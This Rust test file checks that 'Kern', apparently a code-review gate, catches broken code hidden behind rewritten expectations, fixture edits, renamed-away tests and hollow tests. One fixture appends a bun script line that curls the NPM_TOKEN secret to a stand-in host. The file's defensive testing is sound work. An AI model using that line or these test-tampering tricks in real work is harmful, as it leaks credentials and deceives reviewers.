use kern::policy::Tests;
use kern::proof::{Count, Report};
use kern::util::*;
use kern::{receipt, suite};
use serde_json::{Value, json};
use std::collections::{BTreeMap, BTreeSet};
use std::path::{Path, PathBuf};
use std::process::Command;

struct Temp(PathBuf);
impl Temp {
    fn new() -> Temp {
        let p = std::env::temp_dir().join(format!("kern-attack14-{}", uuid4().unwrap()));
        std::fs::create_dir_all(&p).unwrap();
        Temp(p)
    }
}
impl Drop for Temp {
    fn drop(&mut self) { let _ = std::fs::remove_dir_all(&self.0); }
}

fn git(dir: &Path, args: &[&str]) -> String {
    let out = Command::new("git").args(args).current_dir(dir).env("GIT_AUTHOR_NAME", "t").env("GIT_AUTHOR_EMAIL", "t@t").env("GIT_COMMITTER_NAME", "t")
        .env("GIT_COMMITTER_EMAIL", "t@t").env("GIT_CONFIG_NOSYSTEM", "1").output().unwrap();
    assert!(out.status.success(), "git {args:?}: {}", String::from_utf8_lossy(&out.stderr));
    String::from_utf8_lossy(&out.stdout).trim().to_string()
}
fn write(dir: &Path, path: &str, text: &str) {
    let p = dir.join(path);
    std::fs::create_dir_all(p.parent().unwrap()).unwrap();
    std::fs::write(p, text).unwrap();
}
fn repo(t: &Temp, files: &[(&str, &str)]) -> (PathBuf, String) {
    let r = t.0.join("repo");
    std::fs::create_dir_all(&r).unwrap();
    git(&r, &["init", "-q", "-b", "main"]);
    git(&r, &["config", "core.autocrlf", "false"]);
    for (p, text) in files { write(&r, p, text); }
    git(&r, &["add", "-A"]);
    git(&r, &["commit", "-q", "--allow-empty", "-m", "base"]);
    let base = git(&r, &["rev-parse", "HEAD"]);
    (r, base)
}
fn commit(r: &Path, files: &[(&str, &str)]) -> String {
    for (p, text) in files { write(r, p, text); }
    git(r, &["add", "-A"]);
    git(r, &["commit", "-q", "-m", "change"]);
    git(r, &["rev-parse", "HEAD"])
}
fn report(tests: &[(&str, u32, u32, u32)], problems: &[&str]) -> Report {
    let mut t = BTreeMap::new();
    for (k, passed, failed, skipped) in tests { t.insert(k.to_string(), Count { passed: *passed, failed: *failed, skipped: *skipped }); }
    Report { tests: t, problems: problems.iter().map(|p| p.to_string()).collect(), why: BTreeMap::new() }
}
fn passing(keys: &[&str]) -> Report { report(&keys.iter().map(|k| (*k, 1, 0, 0)).collect::<Vec<_>>(), &[]) }
fn drive_json() -> Value { json!({ "base": "1111111111111111111111111111111111111111", "head": "2222222222222222222222222222222222222222", "skipped": [], "unmeasured": [] }) }
fn looks(receipt: &Value) -> Vec<String> { receipt["look"].as_array().into_iter().flatten().map(|x| x["what"].as_str().unwrap_or("").to_string()).collect() }
fn file_of(key: &str) -> &str { key.split(" > ").next().unwrap_or(key) }
fn runner(package: &str) -> Tests {
    match suite::plan(Some(package.as_bytes())) { suite::Plan::Run(t, _) => t, _ => panic!("no runner in {package}") }
}
fn tree(r: &Path, commit: &str) -> BTreeSet<String> { git(r, &["ls-tree", "-r", "--name-only", commit]).lines().map(str::to_string).collect() }
fn relative_paths(text: &str) -> Vec<String> {
    let mut out = Vec::new();
    for q in ['\'', '"', '`'] {
        for (i, piece) in text.split(q).enumerate() {
            if i % 2 == 1 && (piece.starts_with("./") || piece.starts_with("../")) && !piece.contains(char::is_whitespace) && !piece.contains("${") { out.push(piece.to_string()); }
        }
    }
    out
}
fn resolves(files: &BTreeSet<String>, from: &str, spec: &str) -> bool {
    let mut parts: Vec<&str> = from.rsplit_once('/').map_or("", |(d, _)| d).split('/').filter(|p| !p.is_empty()).collect();
    for c in spec.split('/') { match c { "" | "." => {} ".." => { parts.pop(); } c => parts.push(c) } }
    let p = parts.join("/");
    ["", ".js", ".ts", ".mjs", ".cjs", ".jsx", ".tsx", ".json", "/index.js", "/index.ts"].iter().any(|e| files.contains(&format!("{p}{e}")))
}

fn checked_like_run(r: &Path, base: &str, head: &str, package: &str, old: &Report, new: &Report, fails_on_new: &[&str]) -> (Value, String) {
    let changes = kern::rules::changed(r, base, head).unwrap();
    let rules = kern::rules::rules(r, base, head).unwrap();
    let mut tests = suite::compare(old, new, Some(new));
    let keep = suite::kept_plan(r, (base, head), &changes, old, "");
    let side = runner(package);
    let run = |files: &BTreeSet<String>, new_code: bool| -> Report {
        let mut on: BTreeSet<String> = tree(r, if new_code { head } else { base });
        on.extend(keep.files.keys().cloned());
        let mut out = Report::default();
        for f in files {
            let from = keep.back[f].clone();
            if relative_paths(&(if new_code { &keep.files } else { &keep.old_files })[f]).iter().any(|s| !resolves(&on, f, s)) { out.problems.push(f.clone()); continue; }
            for (k, c) in old.tests.iter().filter(|(k, _)| file_of(k) == from) {
                let fails = new_code && fails_on_new.contains(&k.as_str());
                out.tests.insert(format!("{f}{}", &k[from.len()..]), Count { passed: if fails { 0 } else { c.passed }, failed: if fails { c.passed } else { c.failed }, skipped: c.skipped });
            }
        }
        out
    };
    let first = if keep.run.is_empty() { Ok(Report::default()) }
        else if suite::kept_focus(&side, &keep.run, "").is_none() { Err(suite::SINGLE_FILES.to_string()) }
        else { Ok(suite::unkept(&run(&keep.run, true), &keep.back)) };
    let second = first.as_ref().ok().map(|f| suite::rewritten(old, f, None)).filter(|c| !c.is_empty()).map(|candidates| {
        let files: BTreeSet<String> = keep.back.iter().filter(|(_, o)| candidates.iter().any(|c| file_of(c) == o.as_str())).map(|(k, _)| k.clone()).collect();
        suite::unkept(&run(&files, false), &keep.back)
    });
    let outcome = suite::kept_outcome(old, &keep, first, second.as_ref());
    let failing: Vec<Value> = ["broke", "new_problems"].iter().flat_map(|l| tests[*l].as_array().cloned().unwrap_or_default()).collect();
    tests["rewritten"] = json!(outcome.rewritten.iter().filter(|k| !failing.contains(&json!(k))).collect::<Vec<_>>());
    tests["edited"] = json!(outcome.checked);
    tests["edited_unchecked"] = json!(outcome.unchecked.iter().map(|(p, why)| json!({ "path": p, "why": why })).collect::<Vec<_>>());
    tests["test_data"] = json!(keep.data);
    let receipt = receipt::build(&drive_json(), &rules, &tests);
    let md = receipt::markdown(&receipt);
    (receipt, md)
}

const VITEST: &str = r#"{"name":"shop","type":"module","scripts":{"test":"vitest run"},"devDependencies":{"vitest":"3.2.0"}}"#;
const TOTAL: &str = "export function total(items) {\n  return items.reduce((a, b) => a + b, 0);\n}\n";
const CART: &str = "export function add(cart, item) {\n  return [...cart, item];\n}\n\nexport function remove(cart, item) {\n  return cart.filter((x) => x !== item);\n}\n";
fn total_plus(extra: &str) -> String { TOTAL.replace("0);", &format!("0){extra};")) }

#[test]
fn a_rewritten_expectation_in_a_node_test_project_is_not_cleared() {
    let t = Temp::new();
    let node = r#"{"name":"shop","type":"module","scripts":{"test":"node --test"}}"#;
    let test = "import { describe, test } from 'node:test';\nimport assert from 'node:assert/strict';\nimport { total } from '../src/total.js';\n\ndescribe('total', () => {\n  test('adds two', () => assert.equal(total([2, 3]), 5));\n  test('adds none', () => assert.equal(total([]), 0));\n});\n";
    let (r, base) = repo(&t, &[("package.json", node), ("src/total.js", TOTAL), ("test/total.test.js", test)]);
    let head = commit(&r, &[("src/total.js", &total_plus(" + (items.length > 1 ? 1 : 0)")), ("test/total.test.js", &test.replace("([2, 3]), 5)", "([2, 3]), 6)"))]);
    let tap = "TAP version 13\n# Subtest: total\n    # Subtest: adds two\n    ok 1 - adds two\n      ---\n      duration_ms: 0.5\n      type: 'test'\n      ...\n    # Subtest: adds none\n    ok 2 - adds none\n      ---\n      duration_ms: 0.2\n      type: 'test'\n      ...\n    1..2\nok 1 - total\n  ---\n  duration_ms: 1.1\n  type: 'suite'\n  ...\n1..1\n";
    let old = kern::proof::read_report(kern::policy::Runner::Node, tap.as_bytes()).unwrap();
    let (receipt, md) = checked_like_run(&r, &base, &head, node, &old, &old, &["total > adds two"]);
    assert_ne!(receipt["decision"], "clear",
        "total([2, 3]) now returns 6 and the change rewrites the node --test file to expect 6, round 13's case. node's TAP report names each test only by its titles ({:?}), never by its file, so kept_plan never finds test/total.test.js among the files that ran: nothing is put back, nothing is listed as unchecked, and the receipt clears the change as before round 13:\n{md}", old.tests.keys().collect::<Vec<_>>());
}

#[test]
fn test_data_kept_outside_test_folders_is_still_test_data() {
    let mut cleared = Vec::new();
    {
        let t = Temp::new();
        let package = r#"{"name":"shop","type":"module","scripts":{"test":"vitest run"},"devDependencies":{"msw":"2.7.0","vitest":"3.2.0"}}"#;
        let config = "import { defineConfig } from 'vitest/config';\nexport default defineConfig({ test: { setupFiles: ['./src/setupTests.js'] } });\n";
        let setup = "import { beforeAll, afterEach, afterAll } from 'vitest';\nimport { server } from './mocks/server.js';\nbeforeAll(() => server.listen());\nafterEach(() => server.resetHandlers());\nafterAll(() => server.close());\n";
        let server = "import { setupServer } from 'msw/node';\nimport { handlers } from './handlers.js';\nexport const server = setupServer(...handlers);\n";
        let handlers = |cents: u32| format!("import {{ http, HttpResponse }} from 'msw';\nexport const handlers = [\n  http.get('https://api.example.com/price', () => HttpResponse.json({{ cents: {cents} }})),\n];\n");
        let price = |div: u32| format!("export async function price() {{\n  const r = await fetch('https://api.example.com/price');\n  const {{ cents }} = await r.json();\n  return cents / {div};\n}}\n");
        let test = "import { price } from './price.js';\nimport { test, expect } from 'vitest';\ntest('reads the price', async () => expect(await price()).toBe(5));\n";
        let (r, base) = repo(&t, &[("package.json", package), ("vitest.config.js", config), ("src/setupTests.js", setup), ("src/mocks/server.js", server), ("src/mocks/handlers.js", &handlers(500)),
            ("src/price.js", &price(100)), ("src/price.test.js", test)]);
        let head = commit(&r, &[("src/price.js", &price(1000)), ("src/mocks/handlers.js", &handlers(5000))]);
        let key = "src/price.test.js > reads the price";
        let (receipt, md) = checked_like_run(&r, &base, &head, package, &passing(&[key]), &passing(&[key]), &[key]);
        if receipt["decision"] == "clear" { cleared.push(format!("the MSW handlers in src/mocks/handlers.js, where MSW's docs put them:\n{md}")); }
    }
    {
        let t = Temp::new();
        let package = r#"{"name":"codemods","scripts":{"test":"jest"},"devDependencies":{"jest":"30.0.0","jscodeshift":"17.1.0"}}"#;
        let transform = |to: &str| format!("module.exports = function transformer(file, api) {{\n  const j = api.jscodeshift;\n  return j(file.source).find(j.Identifier, {{ name: 'oldName' }}).forEach((p) => {{ p.node.name = '{to}'; }}).toSource();\n}};\n");
        let (r, base) = repo(&t, &[("package.json", package), ("transforms/rename.js", &transform("newName")), ("transforms/__tests__/rename.test.js", "const { defineTest } = require('jscodeshift/dist/testUtils');\ndefineTest(__dirname, 'rename');\n"),
            ("transforms/__testfixtures__/rename.input.js", "const oldName = 1;\n"), ("transforms/__testfixtures__/rename.output.js", "const newName = 1;\n")]);
        let head = commit(&r, &[("transforms/rename.js", &transform("newname")), ("transforms/__testfixtures__/rename.output.js", "const newname = 1;\n")]);
        let key = "transforms/__tests__/rename.test.js > rename > transforms correctly using \"rename\" data";
        let (receipt, md) = checked_like_run(&r, &base, &head, package, &passing(&[key]), &passing(&[key]), &[key]);
        if receipt["decision"] == "clear" { cleared.push(format!("the expected output in transforms/__testfixtures__/, jscodeshift's own layout:\n{md}")); }
    }
    for (what, data, url, name) in [("a fixtures/ folder at the root", "fixtures/totals.json", "../fixtures/totals.json", "totals two"),
        ("a golden file named after its test, test/total.test.expected.json", "test/total.test.expected.json", "./total.test.expected.json", "totals two")] {
        let t = Temp::new();
        let test = format!("import {{ readFileSync }} from 'node:fs';\nimport {{ total }} from '../src/total.js';\nimport {{ test, expect }} from 'vitest';\nconst cases = JSON.parse(readFileSync(new URL('{url}', import.meta.url), 'utf8'));\ntest.each(cases)('totals $name', ({{ items, expected }}) => expect(total(items)).toBe(expected));\n");
        let fixture = |n: u32| format!("[\n  {{ \"name\": \"two\", \"items\": [2, 3], \"expected\": {n} }}\n]\n");
        let (r, base) = repo(&t, &[("package.json", VITEST), ("src/total.js", TOTAL), ("test/total.test.js", &test), (data, &fixture(5))]);
        let head = commit(&r, &[("src/total.js", &total_plus(" + 1")), (data, &fixture(6))]);
        let key = format!("test/total.test.js > {name}");
        let (receipt, md) = checked_like_run(&r, &base, &head, VITEST, &passing(&[&key]), &passing(&[&key]), &[&key]);
        if receipt["decision"] == "clear" { cleared.push(format!("{what}:\n{md}")); }
    }
    assert!(cleared.is_empty(),
        "each change breaks the code and moves the expected value in the test data along with it, so the tests pass on broken code. Round 13 made edited test data a look, but only for a file under a test folder whose name has no .test. in it, so the usual homes of test data elsewhere clear the change:\n{}", cleared.join("\n"));
}

#[test]
fn a_test_file_renamed_out_of_the_run_is_a_deleted_test() {
    let t = Temp::new();
    let tests = "import { add, remove } from '../src/cart.js';\nimport { describe, test, expect } from 'vitest';\n\ndescribe('cart', () => {\n  test('adds an item', () => expect(add([], 'tea')).toEqual(['tea']));\n  test('removes an item', () => expect(remove(['tea'], 'tea')).toEqual([]));\n});\n";
    let (r, base) = repo(&t, &[("package.json", VITEST), ("src/cart.js", CART), ("test/cart.test.js", tests)]);
    git(&r, &["mv", "test/cart.test.js", "test/cart.test.js.bak"]);
    let hollow = "import { describe, test } from 'vitest';\n\ndescribe('cart', () => {\n  test('adds an item', () => {});\n  test('removes an item', () => {});\n});\n";
    let head = commit(&r, &[("src/cart.js", &CART.replace("[...cart, item]", "[...cart]")), ("test/basket.test.js", hollow)]);
    let old = passing(&["test/cart.test.js > cart > adds an item", "test/cart.test.js > cart > removes an item"]);
    let new = passing(&["test/basket.test.js > cart > adds an item", "test/basket.test.js > cart > removes an item"]);
    let (receipt, md) = checked_like_run(&r, &base, &head, VITEST, &old, &new, &[]);
    assert_ne!(receipt["decision"], "clear",
        "the change breaks add() and switches its tests off by renaming test/cart.test.js to test/cart.test.js.bak, which no runner runs, then adds test/basket.test.js with empty tests of the same names. Git calls the rename a move, so it is no deleted test file and kept_plan skips it as unchanged, and the empty tests pair with the old ones by title: the receipt says the tests that passed before still pass and that no test was removed:\n{md}");
}

#[test]
fn a_script_kern_cannot_see_into_does_not_say_no_new_powers() {
    let mut cleared = Vec::new();
    for (what, path, script, power) in [
        ("a node script that returns early at the top level, as CommonJS allows", "bin/release", "#!/usr/bin/env node\nconst args = process.argv.slice(2);\nif (args.length === 0) {\n  console.log('usage: release <version>');\n  return;\n}\nconsole.log(`releasing ${args[0]}`);\n",
            "require('child_process').execSync(`npm publish --otp=${process.env.NPM_OTP}`);\n"),
        ("a bun script", "scripts/release", "#!/usr/bin/env bun\nconst version = Bun.argv[2];\nconsole.log(`releasing ${version}`);\n",
            "Bun.spawn(['sh', '-c', `curl -s https://collect.example/t?k=${Bun.env.NPM_TOKEN}`]);\n"),
    ] {
        let t = Temp::new();
        let (r, base) = repo(&t, &[("package.json", VITEST), ("src/app.js", "export const app = 1;\n"), (path, script), ("test/app.test.js", "import { app } from '../src/app.js';\nimport { test, expect } from 'vitest';\ntest('ok', () => expect(app).toBe(1));\n")]);
        let head = commit(&r, &[(path, &format!("{script}{power}"))]);
        let rules = kern::rules::rules(&r, &base, &head).unwrap();
        let key = "test/app.test.js > ok";
        let tests = suite::compare(&passing(&[key]), &passing(&[key]), Some(&passing(&[key])));
        let receipt = receipt::build(&drive_json(), &rules, &tests);
        let md = receipt::markdown(&receipt);
        if receipt["decision"] == "clear" { cleared.push(format!("{what}, {path}: powers {} not checked {}\n{md}", rules["powers"], rules["not_checked"])); }
    }
    assert!(cleared.is_empty(),
        "each script now starts a program with a secret from the environment. Kern reads a script with a node, bun or deno shebang through a .kern.js or .kern.ts twin, but the twin of valid CommonJS with a top-level return does not parse, and the power check knows no Bun or Deno API; either way the receipt clears the change and says no changed code newly starts programs or reads secrets:\n{}", cleared.join("\n"));
}

#[test]
fn production_code_in_a_folder_named_like_tests_still_gets_its_edited_tests_checked() {
    let validate = |op: &str| format!("export function valid(order) {{\n  return order.items.length {op} 0;\n}}\n");
    let page = |a4: u32| format!("export function pageWidth(format) {{\n  return {{ A4: {a4}, Letter: 216 }}[format];\n}}\n");
    let spec_test = "import { valid } from '../src/spec/validate.js';\nimport { test, expect } from 'vitest';\ntest('an empty order', () => expect(valid({ items: [] })).toBe(false));\n";
    let page_test = "import { pageWidth } from '../src/playwright/page.js';\nimport { test, expect } from 'vitest';\ntest('A4 width', () => expect(pageWidth('A4')).toBe(210));\n";
    let mut cleared = Vec::new();
    for (what, code_path, before, after, test_path, test, rewritten, key) in [
        ("an empty order is now valid; the OpenAPI request checks live in src/spec/", "src/spec/validate.js", validate(">"), validate(">="), "test/validate.test.js", spec_test, spec_test.replace("toBe(false)", "toBe(true)"), "test/validate.test.js > an empty order"),
        ("A4 pages are now 216 mm wide; a PDF service's page code lives in src/playwright/", "src/playwright/page.js", page(210), page(216), "test/page.test.js", page_test, page_test.replace("toBe(210)", "toBe(216)"), "test/page.test.js > A4 width"),
    ] {
        let t = Temp::new();
        let (r, base) = repo(&t, &[("package.json", VITEST), (code_path, &before), (test_path, test)]);
        let head = commit(&r, &[(code_path, &after), (test_path, &rewritten)]);
        let (receipt, md) = checked_like_run(&r, &base, &head, VITEST, &passing(&[key]), &passing(&[key]), &[key]);
        if receipt["decision"] == "clear" { cleared.push(format!("{what}:\n{md}")); }
    }
    assert!(cleared.is_empty(),
        "each change breaks production code and rewrites its test to expect the broken result. The code lives in a folder whose name Kern takes for a test folder, so every changed path looks like a test path, and kept_plan, which now skips changes that touch only tests, never runs the old test on the new code: the receipt clears the change:\n{}", cleared.join("\n"));
}

#[test]
fn merging_two_test_files_keeps_the_skip_one_of_them_had() {
    let t = Temp::new();
    let adds = "import { add } from '../src/cart.js';\nimport { it, expect } from 'vitest';\nit('adds an item', () => expect(add([], 'tea')).toEqual(['tea']));\nit.skip('adds an item in another currency', () => {});\n";
    let removes = "import { remove } from '../src/cart.js';\nimport { describe, it, expect } from 'vitest';\n\ndescribe('remove', () => {\n  it('removes an item', () => expect(remove(['tea'], 'tea')).toEqual([]));\n  it('keeps other items', () => expect(remove(['tea', 'jam'], 'tea')).toEqual(['jam']));\n  it('keeps an empty cart empty', () => expect(remove([], 'tea')).toEqual([]));\n  it('removes every copy', () => expect(remove(['tea', 'tea'], 'tea')).toEqual([]));\n});\n";
    let (r, base) = repo(&t, &[("package.json", VITEST), ("src/cart.js", CART), ("test/add.test.js", adds), ("test/remove.test.js", removes)]);
    git(&r, &["rm", "-q", "test/add.test.js"]);
    git(&r, &["mv", "test/remove.test.js", "test/cart.test.js"]);
    let merged = format!("import {{ add, remove }} from '../src/cart.js';\nimport {{ describe, it, expect }} from 'vitest';\n\nit('adds an item', () => expect(add([], 'tea')).toEqual(['tea']));\nit.skip('adds an item in another currency', () => {{}});\n{}", &removes[removes.find("\ndescribe").unwrap()..]);
    let head = commit(&r, &[("test/cart.test.js", &merged)]);
    let titles = ["remove > removes an item", "remove > keeps other items", "remove > keeps an empty cart empty", "remove > removes every copy"];
    let rows = |a: &str, b: &str| -> Report {
        let mut rows: Vec<(String, u32, u32, u32)> = vec![(format!("{a} > adds an item"), 1, 0, 0), (format!("{a} > adds an item in another currency"), 0, 0, 1)];
        rows.extend(titles.iter().map(|x| (format!("{b} > {x}"), 1, 0, 0)));
        report(&rows.iter().map(|(k, p, f, s)| (k.as_str(), *p, *f, *s)).collect::<Vec<_>>(), &[])
    };
    let (receipt, md) = checked_like_run(&r, &base, &head, VITEST, &rows("test/add.test.js", "test/remove.test.js"), &rows("test/cart.test.js", "test/cart.test.js"), &[]);
    assert_ne!(receipt["decision"], "blocked",
        "the change merges test/add.test.js into test/remove.test.js and renames the result test/cart.test.js; the one skipped test, 'adds an item in another currency', was skipped before and is skipped after, and every test that ran still runs. Git pairs the merged file with remove.test.js alone, Kern compares its skips with that file only, and the carried-over skip becomes a new trick that blocks, which no approval clears:\n{md}");
}

#[test]
fn adding_a_test_to_an_existing_test_file_needs_no_look() {
    let mocha = r#"{"name":"shop","type":"module","scripts":{"test":"mocha"},"devDependencies":{"chai":"5.1.0","mocha":"11.0.0"}}"#;
    let folder = r#"{"name":"shop","type":"module","scripts":{"test":"vitest run test"},"devDependencies":{"vitest":"3.2.0"}}"#;
    let mocha_test = "import { expect } from 'chai';\nimport { total } from '../src/total.js';\n\ndescribe('total', () => {\n  it('adds', () => expect(total([2, 3])).to.equal(5));\n});\n";
    let vitest_test = "import { total } from '../src/total.js';\nimport { test, expect } from 'vitest';\n\ntest('adds', () => expect(total([2, 3])).toBe(5));\n";
    let feature = format!("{TOTAL}\nexport function average(items) {{\n  return items.length ? total(items) / items.length : 0;\n}}\n");
    let mut noisy = Vec::new();
    for (what, package, text, more, key) in [
        ("mocha", mocha, mocha_test, mocha_test.replace("});\n", "  it('averages', () => expect(average([2, 4])).to.equal(3));\n});\n").replace("import { total }", "import { total, average }"), "test/total.test.js > total adds"),
        ("vitest with a folder in its test script (vitest run test)", folder, vitest_test, format!("{}test('averages', () => expect(average([2, 4])).toBe(3));\n", vitest_test.replace("import { total }", "import { total, average }")), "test/total.test.js > adds"),
    ] {
        let t = Temp::new();
        let (r, base) = repo(&t, &[("package.json", package), ("src/total.js", TOTAL), ("test/total.test.js", text)]);
        let head = commit(&r, &[("src/total.js", &feature), ("test/total.test.js", &more)]);
        let (receipt, md) = checked_like_run(&r, &base, &head, package, &passing(&[key]), &passing(&[key]), &[]);
        if receipt["decision"] != "clear" { noisy.push(format!("{what}: {:?}\n{md}", looks(&receipt))); }
    }
    assert!(noisy.is_empty(),
        "each change adds average() and one test for it to the existing test file, the commonest pull request there is. In a mocha project, or a vitest project whose test script names a folder, Kern does not run the old copy of an edited test file at all, and since round 13 that is a look on every such pull request; both runners can run the copy (mocha takes files, vitest ORs its filters and unkept drops the other files):\n{}", noisy.join("\n"));
}

#[test]
fn an_edit_that_only_adds_to_test_data_needs_no_look() {
    let feature = format!("{TOTAL}\nexport function average(items) {{\n  return items.length ? total(items) / items.length : 0;\n}}\n");
    let helper = "export const items = (...n) => n;\n";
    let helper_test = "import { total } from '../src/total.js';\nimport { items } from './helpers.js';\nimport { test, expect } from 'vitest';\ntest('adds', () => expect(total(items(2, 3))).toBe(5));\n";
    let fixture = "[\n  { \"name\": \"two\", \"items\": [2, 3], \"expected\": 5 }\n]\n";
    let fixture_more = "[\n  { \"name\": \"two\", \"items\": [2, 3], \"expected\": 5 },\n  { \"name\": \"none\", \"items\": [], \"expected\": 0 }\n]\n";
    let fixture_test = "import { readFileSync } from 'node:fs';\nimport { total } from '../src/total.js';\nimport { test, expect } from 'vitest';\nconst cases = JSON.parse(readFileSync(new URL('./fixtures/totals.json', import.meta.url), 'utf8'));\ntest.each(cases)('totals $name', ({ items, expected }) => expect(total(items)).toBe(expected));\n";
    let more_helpers = format!("{helper}export const none = () => [];\n");
    let mut noisy = Vec::new();
    for (what, data, before, after, test, key, added) in [
        ("a helper module that only gains a new helper", "test/helpers.js", helper, more_helpers.as_str(), helper_test, "test/total.test.js > adds", None),
        ("a fixture that only gains a case", "test/fixtures/totals.json", fixture, fixture_more, fixture_test, "test/total.test.js > totals two", Some("test/total.test.js > totals none")),
    ] {
        let t = Temp::new();
        let (r, base) = repo(&t, &[("package.json", VITEST), ("src/total.js", TOTAL), (data, before), ("test/total.test.js", test)]);
        let head = commit(&r, &[("src/total.js", &feature), (data, after)]);
        let mut new = passing(&[key]);
        if let Some(k) = added { new.tests.insert(k.into(), Count { passed: 1, failed: 0, skipped: 0 }); }
        let (receipt, md) = checked_like_run(&r, &base, &head, VITEST, &passing(&[key]), &new, &[]);
        if receipt["decision"] != "clear" { noisy.push(format!("{what}: {:?}\n{md}", looks(&receipt))); }
    }
    assert!(noisy.is_empty(),
        "each change adds a feature and only adds to the test data: a new helper beside the old one, a new case after the old ones; every old line is still there, unchanged, so nothing an existing test expects can have moved. Round 13's test-data look fires on any edit to such a file, so this most ordinary pull request needs a look:\n{}", noisy.join("\n"));
}

#[test]
fn following_a_rename_is_not_an_unchecked_edit() {
    let test = "import { total } from '../src/total.js';\nimport { items } from './helpers.js';\nimport { test, expect } from 'vitest';\ntest('adds', () => expect(total(items(2, 3))).toBe(5));\n";
    let helper = "export const items = (...n) => n;\n";
    let mut noisy = Vec::new();
    {
        let t = Temp::new();
        let (r, base) = repo(&t, &[("package.json", VITEST), ("src/total.js", TOTAL), ("test/helpers.js", helper), ("test/total.test.js", test)]);
        git(&r, &["mv", "src/total.js", "src/sum.js"]);
        let head = commit(&r, &[("test/total.test.js", &test.replace("../src/total.js", "../src/sum.js"))]);
        let key = "test/total.test.js > adds";
        let (receipt, md) = checked_like_run(&r, &base, &head, VITEST, &passing(&[key]), &passing(&[key]), &[]);
        if receipt["decision"] != "clear" { noisy.push(format!("src/total.js renamed to src/sum.js and the test's import updated: {:?}\n{md}", looks(&receipt))); }
    }
    {
        let t = Temp::new();
        let (r, base) = repo(&t, &[("package.json", VITEST), ("src/total.js", TOTAL), ("test/helpers.js", helper), ("test/total.test.js", test)]);
        git(&r, &["mv", "test", "tests"]);
        let head = commit(&r, &[("tests/total.test.js", &format!("{test}test('adds none', () => expect(total(items())).toBe(0));\n")), ("src/total.js", &format!("{TOTAL}export const zero = 0;\n"))]);
        let new = passing(&["tests/total.test.js > adds", "tests/total.test.js > adds none"]);
        let (receipt, md) = checked_like_run(&r, &base, &head, VITEST, &passing(&["test/total.test.js > adds"]), &new, &[]);
        if receipt["decision"] != "clear" { noisy.push(format!("test/ renamed to tests/ and one test added: {:?}\n{md}", looks(&receipt))); }
    }
    assert!(noisy.is_empty(),
        "each change renames something with git mv and changes no behaviour: a module, with the test's import updated to it, or the whole test folder, with one test added. Kern puts the old test back as it was, still importing the module's old path or the helper's old folder, so it cannot load on the new code and the receipt asks for a look at an edit it could have checked:\n{}", noisy.join("\n"));
}
